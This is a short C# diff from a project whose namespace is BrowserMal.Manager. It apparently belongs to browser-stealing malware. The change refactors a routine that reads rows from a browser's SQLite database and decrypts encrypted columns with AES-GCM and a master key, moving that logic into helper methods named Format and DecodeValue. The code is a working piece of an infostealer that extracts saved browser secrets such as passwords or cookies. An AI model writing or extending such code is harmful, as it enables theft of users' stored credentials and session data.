@@ -98,21 +98,11 @@ namespace BrowserMal.Manager
 
             for (int i = 0; i < columns.Count; i++)
             {
-                string value;
-                if (columns[i].IsEncrypted())
-                {
-                    value = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i].GetName()), masterKey);
-                }
-                else
-                {
-                    value = sqLiteHandler.GetValue(row, columns[i].GetName());
-                }
-
-                if (columns[i].IsNeedsFormatting())
-                {
-                    values[i] = (string)columns[i].Format(value);
-                    continue;
-                }
+                string value = Format(
+                    DecodeValue(columns[i].IsEncrypted(), sqLiteHandler.GetValue(row, columns[i].GetName()), masterKey), 
+                    columns[i].IsNeedsFormatting(),
+                    columns[i].GetFunction()
+                );
 
                 if (columns[i].IsImportant() && string.IsNullOrEmpty(value))
                 {
@@ -125,6 +115,16 @@ namespace BrowserMal.Manager
 
             ignore = false;
             return values;
+        }
+
+        private string Format(string value, bool needsFormatting, Func<object, object> function)
+        {
+            return (needsFormatting) ? (string)function(value) : value;
+        }
+
+        private string DecodeValue(bool isEncrypted, string outputValue, byte[] masterKey)
+        {
+            return (isEncrypted) ? AesGcm256.GetEncryptedValue(outputValue, masterKey) : outputValue;
         }
     }
 }
